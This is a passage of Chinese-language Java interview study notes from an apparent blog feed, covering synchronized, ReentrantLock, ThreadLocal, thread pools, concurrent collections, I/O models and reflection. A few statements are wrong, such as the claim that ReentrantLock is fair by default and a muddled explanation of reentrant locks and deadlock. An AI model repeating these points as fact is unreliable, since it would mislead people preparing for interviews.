修饰变量，synchronized修饰方法和代码块</li><li>volatile 保证顺序性可见性，synchronized保证可见性和原子性</li><li>volatile 解决变量在多个线程之间的可见性，synchronized解决多线程访问资源的同步性</li></ul><h2 id="ReentrantLock是一个可重入的独占锁"><a href="#ReentrantLock是一个可重入的独占锁" class="headerlink" title="ReentrantLock是一个可重入的独占锁"></a>ReentrantLock是一个可重入的独占锁</h2><ul><li>底层用<code>AbstractQueuedSynchronizer</code> 实现,内部的Sync类继承了AQS类，</li><li>实现公平锁和非公平锁 <code>UnFairSync和FairSync</code>，都是继承的内部类Sync实现的，默认使用公平锁</li></ul><p><strong>可重入锁</strong> 也叫递归锁，指的是线程可以再次获取自己的内部锁。比如一个线程获得了某个对象的锁，此时这个对象锁还没有释放，当其再次想要获取这个对象的锁的时候还是可以获取的，如果是不可重入锁的话，就会造成死锁。</p><h2 id="synchronized-和-reentrantlock"><a href="#synchronized-和-reentrantlock" class="headerlink" title="synchronized 和 reentrantlock"></a>synchronized 和 reentrantlock</h2><ul><li>sychronized 依赖于 jvm的对象监视器monitor、访问标识，reentrantlock依赖于jdk层面</li><li>reentrantlock需要配合trycatch，抛出的异常是InterruptedException</li></ul><h1 id="threadLocal（变量）"><a href="#threadLocal（变量）" class="headerlink" title="threadLocal（变量）"></a>threadLocal（变量）</h1><p>可以让每个线程绑定自己的值，可以将ThreadLocal类形象的比喻成存放数据的盒子，盒子中可以存储每个线程的私有数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 常用方法</span></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadLocalExample</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// SimpleDateFormat 不是线程安全的，所以每个线程都要有自己独立的副本withInitial(obj)作为本地线程的一个对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;SimpleDateFormat&gt; formatter = ThreadLocal.withInitial(() -&gt; <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyyMMdd HHmm"</span>));</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        ThreadLocalExample obj = <span class="keyword">new</span> ThreadLocalExample();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">            Thread t = <span class="keyword">new</span> Thread(obj, <span class="string">""</span>+i);</span><br><span class="line">            t.start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Thread Name= "</span>+Thread.currentThread().getName()+<span class="string">" default Formatter = "</span>+formatter.get().toPattern());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="keyword">new</span> Random().nextInt(<span class="number">1000</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//formatter pattern is changed here by thread, but it won't reflect to other threads</span></span><br><span class="line">        formatter.set(<span class="keyword">new</span> SimpleDateFormat());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"Thread Name= "</span>+Thread.currentThread().getName()+<span class="string">" formatter = "</span>+formatter.get().toPattern());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="threadLocal原理"><a href="#threadLocal原理" class="headerlink" title="threadLocal原理"></a>threadLocal原理</h2><ul><li>通过维护threadlocalmap类型的两个变量<code>threadLocals</code>,<code>inheritableThreadLocals</code>可继承threadlocals</li><li>初始化为null，当当前线程调用set get时，进行创建<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Thread</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//与此线程有关的ThreadLocal值。由ThreadLocal类维护</span></span><br><span class="line">    ThreadLocal.ThreadLocalMap threadLocals = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//与此线程有关的InheritableThreadLocal值。由InheritableThreadLocal类维护</span></span><br><span class="line">    ThreadLocal.ThreadLocalMap inheritableThreadLocals = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="threadlocal内存泄漏问题"><a href="#threadlocal内存泄漏问题" class="headerlink" title="threadlocal内存泄漏问题"></a>threadlocal内存泄漏问题</h2><ul><li><p>ThreadLocalMap 中使用的 key 为 ThreadLocal 的弱引用，而 value 是强引用。</p></li><li><p>所以，如果 ThreadLocal 没有被外部强引用的情况下，在垃圾回收的时候，key 会被清理掉，而 value 不会被清理掉，导致了内存泄漏</p></li><li><p>ThreadLocalMap 中就会出现 key 为 null 的 Entry。假如我们不做任何措施的话，value 永远无法被 GC 回收，这个时候就可能会产生内存泄露。</p></li><li><p>ThreadLocalMap 实现中已经考虑了这种情况，在调用 set()、get()、remove() 方法的时候，会清理掉 key 为 null 的记录。使用完 ThreadLocal方法后最好手动调用remove()方法</p></li><li><p>弱引用WeakReference</p></li><li><p>强引用指可以直接访问对象的引用，一般不会被gc，弱引用的话，弱引用不会阻止被引用对象的垃圾回收，也就是说，当只有弱引用引用一个对象时，垃圾回收器可以随时回收该对象，而不考虑当前内存是否足够。这使得弱引用非常适合用于缓存等场景，当内存资源不足时，缓存中的对象可以被及时释放。</p></li></ul><h2 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h2><p>使用ThreadPoolExecutor构造方法去创建</p><ul><li><strong>FixedThreadPool</strong>：该方法返回一个固定线程数量的线程池。该线程池中的线程数量始终不变。当有一个新的任务提交时，线程池中若有空闲线程，则立即执行。若没有，则新的任务会被暂存在一个任务队列中，待有线程空闲时，便处理在任务队列中的任务。</li><li><strong>SingleThreadExecutor</strong>： 该方法返回一个只有一个线程的线程池。若多余一个任务被提交到该线程池，任务会被保存在一个任务队列中，待线程空闲，按先入先出的顺序执行队列中的任务。</li><li><strong>CachedThreadPool</strong>： 该方法返回一个可根据实际情况调整线程数量的线程池。初始大小为 0。当有新任务提交时，如果当前线程池中没有线程可用，它会创建一个新的线程来处理该任务。如果在一段时间内（默认为 60 秒）没有新任务提交，核心线程会超时并被销毁，从而缩小线程池的大小。</li><li><strong>ScheduledThreadPool</strong>：该方法返回一个用来在给定的延迟后运行任务或者定期执行任务的线程池。</li></ul><h3 id="内置线程池Executor是什么，为什么不建议使用【容易导致内存泄漏】"><a href="#内置线程池Executor是什么，为什么不建议使用【容易导致内存泄漏】" class="headerlink" title="内置线程池Executor是什么，为什么不建议使用【容易导致内存泄漏】"></a>内置线程池Executor是什么，为什么不建议使用【容易导致内存泄漏】</h3><p>使用线程池的好处是减少在创建和销毁线程上所消耗的时间以及系统资源开销，解决资源不足的问题。如果不使用线程池，有可能会造成系统创建大量同类线程而导致消耗完内存或者“过度切换”的问题。</p><p><strong>使用executors返回的线程池可能导致的问题如下：</strong></p><ol><li>FixedThreadPool 和 SingleThreadExecutor：使用的是无界的 LinkedBlockingQueue，任务队列最大长度为 Integer.MAX_VALUE,可能堆积大量的请求，从而导致 OOM</li><li>CachedThreadPool：使用的是同步队列 SynchronousQueue, 允许创建的线程数量为 Integer.MAX_VALUE ，如果任务数量过多且执行速度较慢，可能会创建大量的线程，从而导致 OOM</li><li>ScheduledThreadPool 和 SingleThreadScheduledExecutor : 使用的无界的延迟阻塞队列DelayedWorkQueue，任务队列最大长度为 Integer.MAX_VALUE,可能堆积大量的请求，从而导致 OOM</li></ol><h2 id="实现一个根据任务的优先级来执行的线程池【使用阻塞队列】"><a href="#实现一个根据任务的优先级来执行的线程池【使用阻塞队列】" class="headerlink" title="实现一个根据任务的优先级来执行的线程池【使用阻塞队列】"></a>实现一个根据任务的优先级来执行的线程池【使用阻塞队列】</h2><p>通过构造函数，传入一个<code>ProorityBlockingQueue&lt;Runnable&gt;</code></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java random</title>
      <link href="/2023/01/10/2023-01-10-%E9%9D%A2%E7%BB%8FJava%E9%97%AE%E9%A2%98/"/>
      <url>/2023/01/10/2023-01-10-%E9%9D%A2%E7%BB%8FJava%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>ook</p><a id="more"></a><h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="1-重载和重写的区别"><a href="#1-重载和重写的区别" class="headerlink" title="1. 重载和重写的区别"></a>1. 重载和重写的区别</h2><ul><li><p>重载 overload：方法名相同，返回值和形参，访问修饰符可能不同，发生在一个类中；编译时发生</p></li><li><p>重写 override：发生在继承中，（覆盖），方法名和形参都相同，修饰符大于等于父类，子类不能重写父类的private方法，</p><h2 id="2-string-stringbuffer-stringbuilder"><a href="#2-string-stringbuffer-stringbuilder" class="headerlink" title="2. string stringbuffer stringbuilder"></a>2. string stringbuffer stringbuilder</h2></li></ul><ol><li>string用final修饰，底层用byte[]，java9之前用的char[]，节省字符串占用的内存</li><li>stringbuffer对原对象操作，线程安全，用了sychronized修饰？</li><li>stringbuilder线程不安全，单线程使用这个<h2 id="3-接口interface和抽象类abstract-class的区别"><a href="#3-接口interface和抽象类abstract-class的区别" class="headerlink" title="3. 接口interface和抽象类abstract class的区别"></a>3. 接口interface和抽象类abstract class的区别</h2></li><li>抽象类只能继承一个，接口可以有多个实现</li><li>抽象类中可以有普通成员函数（及实现），包括构造方法，接口只能有public的abstract方法</li><li>抽象类中可以有普通成员变量，            接口只能有public static final类型成员<br>abstract class：只能继承一个<br>interface</li><li>抽象类用于代码复用，比如抽象工厂，接口用于对类的行为进行约束，关注某些操作时用接口</li></ol><h2 id="4-hashcode和equals"><a href="#4-hashcode和equals" class="headerlink" title="4. hashcode和equals"></a>4. hashcode和equals</h2><ul><li>hashcode是获取对象的hash码，作用是确定在哈希表的位置，java任何类都有hashcode()函数，在Object父类里<h2 id="5-ArrayList和LinkedList"><a href="#5-ArrayList和LinkedList" class="headerlink" title="5. ArrayList和LinkedList"></a>5. ArrayList和LinkedList</h2></li><li>ArrayList基于动态数组，连续内存存储，动态用扩容实现，类似于C++的vector和Java、python的slice</li><li>LinkedList基于链表实现，存储分散的内存，适合插入删除，不适合查询，根据下标get(i)需要遍历<h2 id="6-HashMap和HashTable"><a href="#6-HashMap和HashTable" class="headerlink" title="6. HashMap和HashTable"></a>6. HashMap和HashTable</h2></li><li>HashMap并发不安全，HashTable用sychronized修饰，并发安全</li><li>数组+链表实现的，<h2 id="7-jdk7-concurrentHashMap原理"><a href="#7-jdk7-concurrentHashMap原理" class="headerlink" title="7. jdk7.concurrentHashMap原理"></a>7. jdk7.concurrentHashMap原理</h2></li></ul><ol><li>数据结构使用ReentrantLock + Segment + HashEntry  ，一个Segment包含一个HashEntry数组，每个HashEntry是一个链表</li><li>元素查询：使用二次hash，第一次找到segment，第二次定位到元素所在的头部</li><li>锁使用了Segment分段锁，Segment继承ReentrantLock，其他Segment不受影响，数组扩容不影响其他Segment<h2 id="8-jdk8-concurrentHashMap原理"><a href="#8-jdk8-concurrentHashMap原理" class="headerlink" title="8. jdk8.concurrentHashMap原理"></a>8. jdk8.concurrentHashMap原理</h2></li><li>数据结构使用sychronized + CAS +红黑树，Node的next和val都用volatile修饰，查找替换赋值使用CAS</li><li>元素查询：使用CAS查找【】</li><li>锁：锁了head结点，其他元素的读写不受影响，<strong>读操作无锁</strong><h3 id="9-IOC容器和AOP是什么"><a href="#9-IOC容器和AOP是什么" class="headerlink" title="9. IOC容器和AOP是什么"></a>9. IOC容器和AOP是什么</h3></li><li>Inversion of Control 控制反转，就是把对象的创建管理的权利反转给外部的环境</li><li>Aspect Oriented Programming 面向切片编程，将日志、权限、接口等关注点从核心业务分离出来，通过<strong>动态代理</strong>等技术。<strong>各种注解就是以AOP的思想和机制实现的</strong><h2 id="10-Spring的AOP如何实现的【动态代理】"><a href="#10-Spring的AOP如何实现的【动态代理】" class="headerlink" title="10. Spring的AOP如何实现的【动态代理】"></a>10. Spring的AOP如何实现的【动态代理】</h2></li><li>Spring AOP：如果需要代理的对象实现了某个<strong>接口</strong>，SpringAOP使用JDKProxy创建代理对象，如果存在没有实现接口的对象，使用<strong>cglib</strong>生成一个被代理对象的子类作为代理</li><li>Aspect J：切面多的情况下使用，性能有优势<h2 id="11-java程序运行的流程"><a href="#11-java程序运行的流程" class="headerlink" title="11.java程序运行的流程"></a>11.java程序运行的流程</h2></li><li>源码 .java</li><li>编译器</li><li>字节码 .class</li><li>jvm解释器</li><li>机器的二进制码</li><li>运行<h2 id="12-equals-和-的区别"><a href="#12-equals-和-的区别" class="headerlink" title="12. equals 和 == 的区别"></a>12. equals 和 == 的区别</h2></li><li>==比较基础类型，和引用类型的地址是否相同</li><li>equals比较两个对象是否相同</li><li>Integer 与int的比较，<strong>以右边为基础</strong>，使用 Integer == int 发生拆箱；使用int == Integer发生装箱</li><li>Integer.equals(int)发生装箱，再比较内容<h2 id="13-final-finally-finalize的区别"><a href="#13-final-finally-finalize的区别" class="headerlink" title="13. final finally finalize的区别"></a>13. final finally finalize的区别</h2></li><li>final修饰类（不可继承）、方法（不可重写）、变量（不可修改）</li><li>finally修饰代码块，常用于释放资源、关闭连接等</li><li>finalize用于垃圾回收，已经被废弃<h2 id="14-BIO-NIO-AIO"><a href="#14-BIO-NIO-AIO" class="headerlink" title="14. BIO NIO AIO"></a>14. BIO NIO AIO</h2></li><li>阻塞与非阻塞：<ul><li>BIO是阻塞式I/O模型，线程会一直被阻塞等待操作完成。</li><li>NIO是非阻塞式I/O模型，线程可以去做其他任务，当I/O操作完成时得到通知。</li><li>AIO也是非阻塞式I/O模型，不需要用户线程关注I/O事件，由操作系统通过回调机制处理。</li></ul></li><li>缓冲区：<ul><li>BIO使用传统的字节流和字符流，需要为输入输出流分别创建缓冲区。</li><li>NIO引入了基于通道和缓冲区的I/O方式，使用一个缓冲区完成数据读写操作。</li><li>AIO则不需要缓冲区，使用异步回调方式进行操作。</li></ul></li><li>线程模型：<ul><li>BIO采用一个线程处理一个请求方式，面对高并发时线程数量急剧增加，容易导致系统崩溃。</li><li>NIO采用多路复用器来监听多个客户端请求，使用一个线程处理，减少线程数量，提高系统性能。</li><li>AIO依靠操作系统完成I/O操作，不需要额外的线程池或多路复用器。<h4 id="Java-中-3-种常见-IO-模型"><a href="#Java-中-3-种常见-IO-模型" class="headerlink" title="Java 中 3 种常见 IO 模型"></a>Java 中 3 种常见 IO 模型</h4></li></ul></li></ol><h5 id="BIO-Blocking-I-O"><a href="#BIO-Blocking-I-O" class="headerlink" title="BIO (Blocking I/O)"></a>BIO (Blocking I/O)</h5><p><strong>BIO 属于同步阻塞 IO 模型 。</strong></p><p>同步阻塞 IO 模型中，应用程序发起 read 调用后，会一直阻塞，直到在内核把数据拷贝到用户空间。</p><p> <img src="/images/%E9%9D%A2%E8%AF%95%E6%8C%87%E5%8C%97.assets/1624285967500-eb053522-effc-475a-a1dc-eb410d76f572.png" alt="img"></p><p>在客户端连接数量不高的情况下，是没问题的。但是，当面对十万甚至百万级连接的时候，传统的 BIO 模型是无能为力的。因此，我们需要一种更高效的 I/O 处理模型来应对更高的并发量。</p><h5 id="NIO-Non-blocking-New-I-O"><a href="#NIO-Non-blocking-New-I-O" class="headerlink" title="NIO (Non-blocking/New I/O)"></a>NIO (Non-blocking/New I/O)</h5><p>Java 中的 NIO 于 Java 1.4 中引入，对应 java.nio 包，提供了 Channel , Selector，Buffer 等抽象。NIO 中的 N 可以理解为 Non-blocking，不单纯是 New。它支持面向缓冲的，基于通道的 I/O 操作方法。 对于高负载、高并发的（网络）应用，应使用 NIO 。</p><p>Java 中的 NIO 可以看作是 <strong>I/O 多路复用模型</strong>。也有很多人认为，Java 中的 NIO 属于同步非阻塞 IO 模型。</p><p>跟着我的思路往下看看，相信你会得到答案！</p><p>我们先来看看 <strong>同步非阻塞 IO 模型</strong>。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="F:\面试指北\面试指北.assets\1624285967455-d13860a6-06cb-4397-ac09-ca3789187e1a.png" alt="img" title>                </div>                <div class="image-caption">img</div>            </figure><p>同步非阻塞 IO 模型中，应用程序会一直发起 read 调用，等待数据从内核空间拷贝到用户空间的这段时间里，线程依然是阻塞的，直到在内核把数据拷贝到用户空间。</p><p>相比于同步阻塞 IO 模型，同步非阻塞 IO 模型确实有了很大改进。通过轮询操作，避免了一直阻塞。</p><p>但是，这种 IO 模型同样存在问题：<strong>应用程序不断进行 I/O 系统调用轮询数据是否已经准备好的过程是十分消耗 CPU 资源的</strong>。</p><p>这个时候，<strong>I/O 多路复用模型</strong> 就上场了。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="F:\面试指北\面试指北.assets\1624285967508-983b174a-58dd-4327-b345-8027a3f42a21.png" alt="img" title>                </div>                <div class="image-caption">img</div>            </figure><p>IO 多路复用模型中，线程首先发起 select 调用，询问内核数据是否准备就绪，等内核把数据准备好了，用户线程再发起 read 调用。read 调用的过程（数据从内核空间-&gt;用户空间）还是阻塞的。</p><blockquote><p>目前支持 IO 多路复用的系统调用，有 select，epoll 等等。select 系统调用，是目前几乎在所有的操作系统上都有支持</p><ul><li>select 调用 ：内核提供的系统调用，它支持一次查询多个系统调用的可用状态。几乎所有的操作系统都支持。</li><li>epoll 调用 ：linux 2.6 内核，属于 select 调用的增强版本，优化了 IO 的执行效率。</li></ul></blockquote><p><strong>IO 多路复用模型，通过减少无效的系统调用，减少了对 CPU 资源的消耗。</strong></p><p>Java 中的 NIO ，有一个非常重要的<strong>选择器 ( Selector )</strong> 的概念，也可以被称为 <strong>多路复用器</strong>。通过它，只需要一个线程便可以管理多个客户端连接。当客户端数据到了之后，才会为其服务。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/javajob.assets/1624285967445-1152e468-bef7-4d9a-924b-4ef3dad343e0.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h5 id="AIO-Asynchronous-I-O"><a href="#AIO-Asynchronous-I-O" class="headerlink" title="AIO (Asynchronous I/O)"></a>AIO (Asynchronous I/O)</h5><p>AIO 也就是 NIO 2。Java 7 中引入了 NIO 的改进版 NIO 2,它是异步 IO 模型。</p><p>异步 IO 是基于事件和回调机制实现的，也就是应用操作之后会直接返回，不会堵塞在那里，当后台处理完成，操作系统会通知相应的线程进行后续的操作。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/javajob.assets/1624285967551-d3b2369c-21de-4c90-9777-928091acb617.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>目前来说 AIO 的应用还不是很广泛。Netty 之前也尝试使用过 AIO，不过又放弃了。这是因为，Netty 使用了 AIO 之后，在 Linux 系统上的性能并没有多少提升。</p><p>最后，来一张图，简单总结一下 Java 中的 BIO、NIO、AIO。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/面试指北.assets/1624285968982-79ae67ec-fef4-4dc9-8b65-80d1830a78c4.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="15-反射用途和实现原理"><a href="#15-反射用途和实现原理" class="headerlink" title="15. 反射用途和实现原理"></a>15. 反射用途和实现原理</h2><p>反射是通过<strong>运行时</strong>检查类信息完成的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; cls = ClassName.class;</span><br><span class="line">Class&lt;?&gt; cls = obj.getClass();</span><br><span class="line">Class&lt;?&gt; cls = Class.forName(<span class="string">"ClassName"</span>);</span><br></pre></td></tr></table></figure><p>原理：反射API实现，Class，Method，Field，Constructor</p><h3 id="Class-forName和ClassLoader的区别"><a href="#Class-forName和ClassLoader的区别" class="headerlink" title="Class.forName和ClassLoader的区别"></a>Class.forName和ClassLoader的区别</h3><ul><li>Class.forName是一个<strong>静态</strong>方法，通过提供类的完全限定名，在运行时加载类。此方法还会执行类的静态初始化块。如果类名不存在或无法访问，将抛出ClassNotFoundException异常。</li><li>ClassLoader<strong>是一个抽象类，类加载器</strong>，负责将类文件加载到Java虚拟机中。ClassLoader可以<strong>动态加载类</strong>，从不同来源加载类文件，如本地文件系统、网络等。</li></ul><h2 id="16-可重入锁是什么？解释ReentrantLock和sychronized的区别"><a href="#16-可重入锁是什么？解释ReentrantLock和sychronized的区别" class="headerlink" title="16. 可重入锁是什么？解释ReentrantLock和sychronized的区别"></a>16. 可重入锁是什么？解释ReentrantLock和sychronized的区别</h2><p>可重入锁是允许重新获取机制的锁。就像拿钥匙开锁一样，你可以反复用同一把钥匙开锁。这种锁在同一线程内是安全的，因为它可以被同一线程多次获取，而不会产生不一致的状态。<br>举个例子，假设有一个线程A在执行一个方法，同时这个方法内部又调用另一个方法，那么线程A可以重复获取同一个锁，而不会出现死锁的情况。因为同一线程可以多次获取同一个锁，所以这种锁机制避免了死锁的发生。<br>但是需要注意，在使用可重入锁时，必须保证在释放锁之前已经获取了该锁，否则会导致死锁。同时还需要保证在获取锁的时候没有嵌套地获取其他锁，否则也会导致死锁。另外，还必须保证在获取锁的时候没有阻塞其他线程，否则同样会导致死锁。<br>总之，可重入锁是一种安全的锁机制，可以避免死锁的发生。但是在使用时需要注意以上几点，以确保程序的正确性和安全性。</p><ul><li><strong>实现上</strong>：synchronized 是一个关键字，是在JVM层面通过监视器实现的，而 ReentrantLock 是基于AQS（AbstractQueuedSynchronizer）实现的。</li><li><strong>用法上</strong>：reentrantlock修饰代码块，synchronized修饰方法，静态方法和代码块</li><li><strong>显隐式</strong>：Synchronized 是隐式锁，进入synchronized代码块之后自动加锁，离开后自动释放锁；ReentrantLock显示定义，然后手动用lockunlock</li><li><strong>中断响应</strong>：sync不能直接响应终端，reentrantlock可以响应中断，避免死锁<h2 id="17-java序列化讲一下"><a href="#17-java序列化讲一下" class="headerlink" title="17. java序列化讲一下"></a>17. java序列化讲一下</h2>指将Java对象转换为字节流的过程，可以将这些字节流保存到文件中或通过网络传输。使用implements Serializable接口<h2 id="18-notify-和-notifyall-的区别"><a href="#18-notify-和-notifyall-的区别" class="headerlink" title="18. notify()和 notifyall()的区别"></a>18. notify()和 notifyall()的区别</h2></li><li>notify方法用于唤醒在当前对象上等待的单个线程,具体是哪个线程被唤醒是不确定的，取决于线程调度器的实现</li><li>notifyall 用于唤醒在当前对象上等待的所有线程。<ul><li>如果有多个线程在某个对象上等待，调用notifyAll()方法后，所有等待的线程都会被唤醒并竞争该对象的锁。其中一个线程获得锁后继续执行，其他线程则继续等待。<h2 id="19-静态内部类和非静态内部类"><a href="#19-静态内部类和非静态内部类" class="headerlink" title="19. 静态内部类和非静态内部类"></a>19. 静态内部类和非静态内部类</h2></li></ul></li></ul><ol><li>实例化方式：静态内部类可以直接通过外部类名来实例化，而非静态内部类必须要通过外部类的实例来实例化。</li><li>对外部类的引用：静态内部类不持有对外部类实例的引用，而非静态内部类则会持有对外部类实例的引用。这意味着在静态内部类中不能直接访问外部类的非静态成员（方法或字段），而非静态内部类可以。</li><li>生命周期：静态内部类的生命周期与外部类相互独立，即使外部类实例被销毁，静态内部类仍然存在。非静态内部类的生命周期与外部类实例绑定，只有在外部类实例存在时才能创建非静态内部类的实例。</li><li>访问权限：静态内部类对外部类的访问权限与其他类一样，根据访问修饰符而定。非静态内部类可以访问外部类的所有成员，包括私有成员<h2 id="20-自定义注解的场景和实现"><a href="#20-自定义注解的场景和实现" class="headerlink" title="20. 自定义注解的场景和实现"></a>20. 自定义注解的场景和实现</h2></li><li>扩展框架</li><li>运行时检查，单元测试，配和写Log等</li><li>规范约束<h3 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a><strong>实现方式</strong></h3></li><li>使用@interface关键字定义注解。</li><li>可在注解中定义属性，并指定默认值。</li><li>根据需求，可添加元注解来控制注解的使用方式。</li><li>在代码中使用自定义注解。</li><li>使用反射机制解析注解信息。<h2 id="21-java的构造器能否被重写-override【不可以，只能在子类super父类进行增量更改】"><a href="#21-java的构造器能否被重写-override【不可以，只能在子类super父类进行增量更改】" class="headerlink" title="21. java的构造器能否被重写 override【不可以，只能在子类super父类进行增量更改】"></a>21. java的构造器能否被重写 override【不可以，只能在子类super父类进行增量更改】</h2></li></ol><h2 id="22-java实现对象克隆【深拷贝浅拷贝】"><a href="#22-java实现对象克隆【深拷贝浅拷贝】" class="headerlink" title="22. java实现对象克隆【深拷贝浅拷贝】"></a>22. java实现对象克隆【深拷贝浅拷贝】</h2><ol><li>浅拷贝：通过创建一个新对象，并将原对象的非静态字段值复制给新对象实现。新对象和原对象共享引用数据。在Java中，可以使用clone()方法实现浅拷贝。要实现一个类的克隆操作，需要满足以下条件<ul><li>实现Cloneable接口。</li><li>重写Object类的clone()方法，声明为public访问权限。</li><li>在clone()方法中调用super.clone()，并处理引用类型字段。</li></ul></li><li>深拷贝：通过创建一个新对象，并将原对象的所有字段值复制给新对象，包括引用类型数据。新对象和原对象拥有独立的引用数据。实现深拷贝有以下方式：<ul><li>使用序列化和反序列化实现深拷贝，要求对象及其引用类型字段实现Serializable接口。</li><li>自定义拷贝方法，递归拷贝引用类型字段。<h2 id="23-java中常见的运行时异常"><a href="#23-java中常见的运行时异常" class="headerlink" title="23. java中常见的运行时异常"></a>23. java中常见的运行时异常</h2></li></ul></li><li>空指针异常：当应用程序尝试使用 null 对象时抛出。</li><li>数组越界异常：当应用程序尝试访问数组元素的时候，数组下标超出了数组的范围。</li><li>类转换异常：当应用程序尝试将一个对象强制转换为不是其实例的子类时抛出。</li><li>非法参数异）：当应用程序传递了一个无效或不合法的参数时抛出。</li><li>非法状态异常：当应用程序调用了一个不合适的方法或处于不正确的状态时抛出<h2 id="24-synchronized的实现原理是什么"><a href="#24-synchronized的实现原理是什么" class="headerlink" title="24. synchronized的实现原理是什么"></a>24. synchronized的实现原理是什么</h2>通过互斥锁来控制线程对共享变量的访问。</li><li>synchronized的实现基础是对象内部的锁（也称为监视器锁或管程），每个锁关联着一个对象实例。</li><li>当synchronized作用于某个对象时，它就会尝试获取这个对象的锁，如果锁没有被其他线程占用，则当前线程获取到锁，并可以执行同步代码块；如果锁已经被其他线程占用，那么当前线程就会阻塞在同步块之外，直到获取到锁才能进入同步块。</li><li>synchronized还支持作用于类上，此时它锁住的是整个类，而不是类的某个实例。在这种情况下，由于只有一个锁存在，所以所有使用该类的线程都需要等待锁的释放。</li><li>在JVM内部，每个Java对象都有头信息，其中包含了对象的一些元信息和状态标志。synchronized通过修改头信息的状态标志来实现锁的获取和释放。</li><li>synchronized还支持<strong>可重入性，即在同一个线程中可以多次获取同一个锁，这样可以避免死锁问题</strong>。</li><li>Java虚拟机会通过锁升级的方式来提升synchronized的效率，比如偏向锁、轻量级锁和重量级锁等机制，使得在竞争不激烈的情况下，synchronized的性能可以达到与非同步代码相当的水平。<h2 id="25-ThreadLocal和场景和原理"><a href="#25-ThreadLocal和场景和原理" class="headerlink" title="25. ThreadLocal和场景和原理"></a>25. ThreadLocal和场景和原理</h2></li><li>为每个线程创建独立的变量副本，避免竞争状态，代码层面的体验是一定程度上简化了多线程设计</li><li>原理是每个线程都有自己的threadlocalmap，<strong>ThreadLocal 对象充当键，线程的变量副本作为对应键的值</strong>，set get进行资源设置和获取<h3 id="注意避坑【内存泄漏，线程安全性，数据隔离】"><a href="#注意避坑【内存泄漏，线程安全性，数据隔离】" class="headerlink" title="注意避坑【内存泄漏，线程安全性，数据隔离】"></a>注意避坑【内存泄漏，线程安全性，数据隔离】</h3><h3 id="应用场景【线程池，数据库连接管理，传递上下文信息】"><a href="#应用场景【线程池，数据库连接管理，传递上下文信息】" class="headerlink" title="应用场景【线程池，数据库连接管理，传递上下文信息】"></a>应用场景【线程池，数据库连接管理，传递上下文信息】</h3><h3 id="如何防止内存泄漏"><a href="#如何防止内存泄漏" class="headerlink" 